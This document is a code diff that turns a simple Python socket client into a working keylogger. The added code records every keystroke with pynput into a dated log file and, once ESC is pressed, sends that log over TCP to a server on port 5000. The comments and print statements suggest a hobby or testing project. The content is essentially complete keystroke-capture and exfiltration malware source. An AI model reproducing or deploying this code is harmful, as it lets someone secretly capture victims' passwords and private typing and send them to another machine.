@@ -1,14 +1,92 @@
-import socket
+import socket                                                                           # for server
+from pynput.keyboard import Key, Listener                                               # for keylogger
+import datetime                                                                         # for date
+import time                                                                             # for time
 
+FORMAT = "utf-8"
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+"""AF_INET means we are using using ipV4"""
+"""SOCK_STREAM means we are using a TCP (a connection type protocol that needs a handshake)"""
 
-host = ""
-port = 5000
+host = socket.gethostbyname(socket.gethostname())                                       # setting host to computer's ip
+port = 5000                                                                             # setting port to 5000
 
-client.connect((host, port))
+filename = "[" + str(datetime.date.today()) + "]log.txt"                                # inserting date into filename
 
-message = client.recv(1024)
 
-client.close()
+def keylogger():
+    print("Keylogger has started.")                                                     # output to console for testing
+    with open("data/" + filename, "a") as f:
+        f.write("\n" + str(time.strftime("%H:%M:%S", time.localtime())) + ": ")         # opening the file and writing the time
 
-print(message.decode('ascii'))
+    def on_press(key):
+
+        keys = [key]                                                                    # list of keys pressed
+        print("{} pressed".format(key))                                                 # console message for every key pressed
+
+        write_file(keys)                                                                # calling write_file function and passing keys list
+
+    def write_file(keys):                                                               # key handling function
+
+        with open("data/" + filename, "a") as f:                                        # opening text file on Client side
+
+            for key in keys:
+                k = str(key).replace("'", "")
+                if k.find("space") > 0:
+                    f.write(' ')
+                if k.find("enter") > 0:
+                    f.write("\n")
+                    f.write(str(time.strftime("%H:%M:%S", time.localtime())) + ": ")
+                if k.find("tab") > 0:
+                    f.write("\t")
+                if k.find("Key") == -1:
+                    f.write(k)
+                if k.find("alt") > 0:
+                    f.write("'ALT'")
+                if k.find("backspace") > 0:
+                    f.write("\b")
+                if k.find("caps_lock") > 0:
+                    f.write("'CAPS'")
+                elif k.find("ctrl") > 0:
+                    f.write("'CTRL'")
+                elif k.find("delete") > 0:
+                    f.write("'DEL'")
+                elif k.find("shift") > 0:
+                    f.write("'SHIFT'")
+                elif k.find("down") > 0:
+                    f.write("'DOWNARROW'")
+                elif k.find("left") > 0:
+                    f.write("'LEFTARROW'")
+                elif k.find("right") > 0:
+                    f.write("'RIGHTARROW'")
+                elif k.find("up") > 0:
+                    f.write("'UPARROW'")
+
+    def on_release(key):                                                                    # handles exiting white ESC is pressed
+        if key == Key.esc:
+            send_file()                                                                     # calling send_file() function
+            return False
+
+    with Listener(on_press=on_press, on_release=on_release) as listener:                    # using Listener function from pynput
+        listener.join()
+
+
+def send_file():                                                                            # Handles sending text file to server
+    client.connect((host, port))
+    file = open("data/" + filename, "r")                                                    # opens file in read mode
+    data = file.read()
+
+    client.send(filename.encode(FORMAT))                                                    # sending filename to server
+
+    message = client.recv(1024).decode(FORMAT)                                              # receiving message from server (testing purposes)
+    print("[SERVER]: " + message)
+
+    client.send(data.encode(FORMAT))                                                        # sending the contents of the text file to the server
+    message = client.recv(1024).decode(FORMAT)
+    print("[SERVER]: " + message)                                                           # closing message from server
+
+    file.close()                                                                            # closing text file
+    client.close()                                                                          # closing client
+
+
+keylogger()
